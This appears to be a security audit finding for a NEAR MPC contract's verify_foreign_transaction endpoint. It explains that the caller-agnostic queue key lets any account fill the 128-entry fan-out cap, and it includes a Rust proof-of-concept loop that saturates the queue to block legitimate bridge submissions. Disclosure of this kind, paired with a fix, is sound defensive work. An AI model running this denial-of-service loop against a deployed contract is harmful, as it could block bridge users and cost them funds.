### Title
Caller-Agnostic `verify_foreign_transaction` Queue Key Allows Any Unprivileged Caller to Saturate the Per-Request Fan-Out Cap, Blocking Legitimate Bridge Submissions - (File: `crates/contract/src/pending_requests.rs`)

---

### Summary

The `verify_foreign_transaction` endpoint stores pending yields under a **caller-agnostic** map key (`VerifyForeignTransactionRequest = {request, domain_id, payload_version}`). Because the caller's account ID is not part of the key, any unprivileged account can fill the 128-slot fan-out queue for any specific foreign transaction with 128 spam submissions costing only 128 yoctoNEAR total. Once the cap is reached, every subsequent legitimate submission for that same foreign transaction panics with `PendingRequestQueueFull`, breaking the request-lifecycle invariant for bridge users. The attacker can sustain the blockade indefinitely by refilling the queue each time MPC nodes drain it.

---

### Finding Description

**Root cause — caller-agnostic queue key for `verify_foreign_transaction`:**

`sign` derives its map key via `SignatureRequest::new`, which folds the caller's account ID into a `tweak`:

```rust
// crates/near-mpc-crypto-types/src/sign.rs:118-125
pub fn new(domain: DomainId, payload: Payload, predecessor_id: &AccountId, path: &str) -> Self {
    let tweak = crate::kdf::derive_tweak(predecessor_id, path);
    SignatureRequest { domain_id: domain, tweak, payload }
}
```

Different callers therefore produce different map keys and cannot interfere with each other's queues.

`verify_foreign_transaction` converts its args to a `VerifyForeignTransactionRequest` that contains **no caller identity**:

```rust
// crates/near-mpc-contract-interface/src/types/foreign_chain.rs:124-128
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

All callers submitting the same `(chain_request, domain_id, payload_version)` tuple share a single queue entry. The codebase itself acknowledges this in a test comment:

> "a different account would today be blocked from receiving a response by alice's submission."

**Cap enforcement — `push_pending_yield`:**

```rust
// crates/contract/src/pending_requests.rs:51-58
if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
    env::panic_str(
        &RequestError::PendingRequestQueueFull { limit: MAX_PENDING_REQUEST_FAN_OUT }
            .to_string(),
    );
}
```

`MAX_PENDING_REQUEST_FAN_OUT = 128`. Once the queue for a given `VerifyForeignTransactionRequest` key holds 128 entries, every further call to `verify_foreign_transaction` with the same arguments panics immediately, regardless of who the caller is.

**Attack flow:**

1. Attacker calls `verify_foreign_transaction` 128 times with the same `{tx_id, domain_id, payload_version}` (cost: 128 yoctoNEAR ≈ $0).
2. Queue for that request key is saturated.
3. Any legitimate bridge user submitting the same foreign-tx verification request receives `PendingRequestQueueFull` and their transaction fails.
4. MPC nodes eventually respond, draining the queue.
5. Attacker immediately refills the queue (step 1 again), sustaining the blockade indefinitely.

---

### Impact Explanation

**Medium — request-lifecycle manipulation breaking production safety invariants.**

The bridge's core safety invariant is that any user holding a valid foreign-chain transaction can submit it for MPC verification. This invariant is broken: a single unprivileged account can permanently prevent any other account from submitting a specific foreign-tx verification request, as long as the attacker keeps refilling the queue. In a time-sensitive bridge context (e.g., inbound Omnibridge flows with deadlines), this can cause irreversible loss of bridged funds for the victim even though the attacker never touches the funds directly.

---

### Likelihood Explanation

**Medium-High.** The attack requires no special role, no key material, and no collusion. The cost is 128 yoctoNEAR per drain cycle (effectively zero on NEAR). Any account that can call the contract can execute this. The only constraint is that the attacker must know the target `tx_id` in advance, which is public information on the foreign chain.

---

### Recommendation

Include the caller's `predecessor_account_id` in the `VerifyForeignTransactionRequest` map key, mirroring the `sign` path. One approach: derive a per-caller tweak (as `SignatureRequest` does) and store it in the key, so each caller occupies a distinct queue slot. Alternatively, enforce a per-`(caller, request)` submission limit at the contract level before enqueuing.

---

### Proof of Concept

```rust
// Attacker saturates the queue for a specific Bitcoin tx
for _ in 0..128 {
    attacker_account.call(contract.id(), "verify_foreign_transaction")
        .args_json(json!({ "request": {
            "domain_id": 0,
            "payload_version": "V1",
            "request": { "Bitcoin": { "tx_id": TARGET_TX_ID, "confirmations": 1,
                                      "extractors": ["BlockHash"] } }
        }}))
        .deposit(NearToken::from_yoctonear(1))
        .max_gas()
        .transact_async()
        .await?;
}

// Legitimate bridge user is now blocked
let result = bridge_user.call(contract.id(), "verify_foreign_transaction")
    .args_json(/* same request */)
    .deposit(NearToken::from_yoctonear(1))
    .max_gas()
    .transact()
    .await?
    .into_result();

assert!(result.is_err()); // "Pending-request queue is full"
// Attacker refills queue after MPC nodes drain it — blockade is sustained indefinitely
```

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** crates/contract/src/pending_requests.rs (L37-59)
```rust
pub const MAX_PENDING_REQUEST_FAN_OUT: u8 = 128;

/// Append a yield index to the pending-request fan-out queue for `request`.
///
/// Panics with `RequestError::PendingRequestQueueFull` if the resulting queue would
/// exceed `MAX_PENDING_REQUEST_FAN_OUT`.
pub(crate) fn push_pending_yield<K>(
    requests: &mut LookupMap<K, Vec<YieldIndex>>,
    request: K,
    data_id: CryptoHash,
) where
    K: BorshSerialize + BorshDeserialize + Clone + Ord,
{
    let queue = requests.entry(request).or_default();
    if queue.len() >= usize::from(MAX_PENDING_REQUEST_FAN_OUT) {
        env::panic_str(
            &RequestError::PendingRequestQueueFull {
                limit: MAX_PENDING_REQUEST_FAN_OUT,
            }
            .to_string(),
        );
    }
    queue.push(YieldIndex { data_id });
```

**File:** crates/near-mpc-contract-interface/src/types/foreign_chain.rs (L124-128)
```rust
pub struct VerifyForeignTransactionRequest {
    pub request: ForeignChainRpcRequest,
    pub domain_id: DomainId,
    pub payload_version: ForeignTxPayloadVersion,
}
```

**File:** crates/contract/src/lib.rs (L519-557)
```rust
    pub fn verify_foreign_transaction(&mut self, request: VerifyForeignTransactionRequestArgs) {
        log!(
            "verify_foreign_transaction: predecessor={:?}, request={:?}",
            env::predecessor_account_id(),
            request
        );

        self.check_request_preconditions(
            request.domain_id,
            DomainPurpose::ForeignTx,
            Gas::from_tgas(self.config.sign_call_gas_attachment_requirement_tera_gas),
            MINIMUM_SIGN_REQUEST_DEPOSIT,
        );

        let requested_chain = request.request.chain();
        let supported_chains = self.get_supported_foreign_chains();
        if !supported_chains.contains(&requested_chain) {
            env::panic_str(
                &InvalidParameters::ForeignChainNotSupported {
                    requested: requested_chain,
                }
                .to_string(),
            );
        }

        let callback_gas = Gas::from_tgas(
            self.config
                .return_signature_and_clean_state_on_success_call_tera_gas,
        );

        let request = args_into_verify_foreign_tx_request(request);
        let callback_args = serde_json::to_vec(&(&request,)).unwrap();
        self.enqueue_yield_request(
            method_names::RETURN_VERIFY_FOREIGN_TX_AND_CLEAN_STATE_ON_SUCCESS,
            callback_args,
            callback_gas,
            move |this, id| this.add_verify_foreign_tx_request(request, id),
        );
    }
```

**File:** crates/contract/src/lib.rs (L3241-3255)
```rust

        // And: caller bob submits the identical request — a different account would today
        // be blocked from receiving a response by alice's submission.
        let bob = AccountId::from_str("bob.near").unwrap();
        testing_env!(
            VMContextBuilder::new()
                .signer_account_id(bob.clone())
                .predecessor_account_id(bob)
                .current_account_id(context.current_account_id.clone())
                .attached_deposit(NearToken::from_yoctonear(1))
                .build()
        );
        contract.verify_foreign_transaction(request_args);

        // Then: both yields are queued under the single (caller-agnostic) request key.
```

**File:** crates/near-mpc-crypto-types/src/sign.rs (L117-125)
```rust
impl SignatureRequest {
    pub fn new(domain: DomainId, payload: Payload, predecessor_id: &AccountId, path: &str) -> Self {
        let tweak = crate::kdf::derive_tweak(predecessor_id, path);
        SignatureRequest {
            domain_id: domain,
            tweak,
            payload,
        }
    }
```
